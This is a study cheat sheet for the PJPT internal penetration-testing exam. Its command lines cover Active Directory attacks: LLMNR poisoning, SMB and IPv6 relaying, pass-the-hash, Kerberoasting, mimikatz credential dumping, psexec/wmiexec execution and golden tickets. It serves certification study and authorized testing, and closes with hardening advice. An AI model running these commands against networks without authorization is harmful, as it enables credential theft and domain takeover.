
# 🛡️ PJPT Cheat Sheet

**Practical Junior Penetration Tester (PJPT) Internal Pentest Cheat Sheet**

This repository provides a comprehensive and field-tested cheat sheet tailored for candidates preparing for the **PJPT certification** by **TCM Security**. It covers key tools, commands, and techniques commonly used during internal network penetration tests—especially those focused on Active Directory environments.

You'll find organized sections for reconnaissance, initial access, credential attacks (like LLMNR poisoning, Kerberoasting, and pass-the-hash), post-exploitation, ticket-based persistence, and cleanup strategies. Each section is designed to be clear, actionable, and exam-relevant, helping you quickly recall syntax and methodology under pressure.

Whether you're actively taking the PJPT exam or sharpening your red team skills, this cheat sheet offers a solid technical reference to support your workflow.

---

## 🧭 Recon & Enumeration

```bash
arp-scan -l
netdiscover -r <subnet>
nmap -T4 -p- -sS -A <target>
```

## 🏹 Initial Active Directory Attacks

### 🔄 LLMNR Poisoning

```bash
responder -I tun0 -dwPv
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### 📎 SMB Relay

```bash
nmap --script=smb2-security-mode.nse -p445 <subnet>
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

### 🌐 IPv6 Relay via LDAPS

```bash
mitm6 -d domain.local
ntlmrelayx.py -6 -t ldaps://<DC-IP> -wh fakewpad.domain.local
```

## 🔐 Credential Access & Post-Exploitation

### 🧱 Pass-the-Hash

```bash
crackmapexec smb <subnet> -u administrator -H <NTLM-hash>
```

### 🔥 Kerberoasting

```bash
GetUserSPNs.py DOMAIN/user:pass -dc-ip <DC-IP> -request
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

### 💾 Credential Dumping

```bash
secretsdump.py DOMAIN/user:pass@<host>
meterpreter > hashdump
mimikatz # privilege::debug
mimikatz # sekurlsa::logonPasswords
```

## ⚙ Remote Code Execution Techniques

### 🖥️ PSEXEC (Impacket)

```bash
psexec.py DOMAIN/user:pass@<target>
```

### 💣 Metasploit PSEXEC

```bash
use exploit/windows/smb/psexec
set RHOST <target>
set SMBUser <user>
set SMBPass <password>
```

### 🔄 WMIExec

```bash
wmiexec.py administrator@<target> --hashes <LM>:<NTLM>
```

## 🎟️ Ticket Attacks & Persistence

### 🎫 TGT Harvesting

```bash
getTGT.py DOMAIN/fservice:pass -dc-ip <DC-IP>
export KRB5CCNAME=fservice.ccache
klist
```

### 🥇 Golden Ticket Attack

```powershell
mimikatz # lsadump::lsa /inject /name:krbtgt
mimikatz # kerberos::golden /User:Administrator /domain:domain.local \
 /sid:<SID> /krbtgt:<hash> /id:<RID> /ptt
```

## 🧠 Additional Techniques

- **AS-REP Roasting** (against users without Kerberos pre-auth)
- **Zerologon (CVE-2020-1472)** — exploit Netlogon flaw
- **PrintNightmare (CVE-2021-1675)** — RCE via print spooler

---

## 📌 Cleanup & Monitoring Recommendations

- Rotate compromised accounts & service passwords
- Enforce SMB signing, disable LLMNR & NetBIOS
- Monitor for tools like: `responder`, `mitm6`, `ntlmrelayx`, `psexec`, `mimikatz`

---

> ✍️ This cheat sheet was created as a personal reference for the PJPT exam. Use responsibly and only in authorized environments.
